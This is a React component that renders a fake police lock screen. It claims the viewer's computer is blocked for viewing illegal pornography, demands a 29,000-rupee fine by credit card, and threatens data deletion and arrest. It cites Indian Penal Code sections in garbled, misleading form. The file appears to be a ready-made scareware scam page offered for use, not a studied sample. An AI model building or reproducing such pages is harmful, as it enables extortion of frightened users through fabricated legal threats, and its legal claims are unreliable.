import React from 'react';

const LeftContent = () => {
  return (
    <div className="flex-1 p-2 bg-gray-50 flex flex-col min-h-full">
      <div className="flex-1">
        {/* New "YOUR COMPUTER HAS BEEN BLOCKED" message */}
        <div className="bg-transparent border-2 border-red-600 p-4 rounded-lg mb-4 text-center">
          <h1 className="text-2xl font-bold text-red-600 mb-2">
            YOUR COMPUTER HAS BEEN BLOCKED
          </h1>
          <div className="text-xs text-red-700">(Indian Penal Code act8 Section 1860/292,293)</div>
        </div>

        {/* Expanded Red Alert Message */}
        <div className="bg-red-600 text-white p-6 rounded-lg mb-4 shadow-lg">
          <div className="space-y-4 text-sm leading-relaxed">
            <p className="font-semibold">
              Your browser has been blocked due to repeated visits to pornographic sites containing materials prohibited by the laws of the India, namely, pornography promoting pedophilia, violence and homosexuality.
            </p>
            
            <p className="font-medium">
              You must pay a fine of Indian rupee 29000 by credit card as prescribed by IPC section 292 and 293.
            </p>
            
            <p className="text-yellow-200 font-semibold">
              Attention! If you fail to pay a fine or attempt to unblock your computer without paying a fine, all information on your device will be permanently deleted in order to prevent the dissemination of pornography.
            </p>
            
            <p>
              The police will come to your home to arrest you and criminal charges will be filed against you. Your device will be unlocked automatically after the fine is paid.
            </p>
            
            <p className="text-sm">
              <strong>Section 292 (1)</strong> A person who distributes or displays in public obscene objects such as documents, drawings or recording media contained in electronic or magnetic records is punished by imprisonment for not more than 2 years, a fine of not more than 250,000 Indian rupee or paltry fine, or both imprisonment and a fine. The same applies to a person who distributes obscene records including electronic or magnetic records through the transmission of telecommunications.
            </p>
            
            <p className="text-sm">
              <strong>(2)</strong> The same applies to a person who possesses the objects referred to in the preceding paragraph or stores electronic or magnetic records referred to in the same paragraph for the purpose of viewing them.
            </p>
            
            <p className="font-medium text-yellow-200">
              Your browser will be unlocked automatically after the fine payment.
            </p>
            
            <p className="text-yellow-200 font-semibold">
              Attention! In case of non-payment of the fine, or your attempts to unlock the device independently, case materials will be transferred to Ministry of Law for the institution of criminal proceedings against you due to commitment a crime.
            </p>
          </div>
        </div>


      </div>
    </div>
  );
};

export default LeftContent;
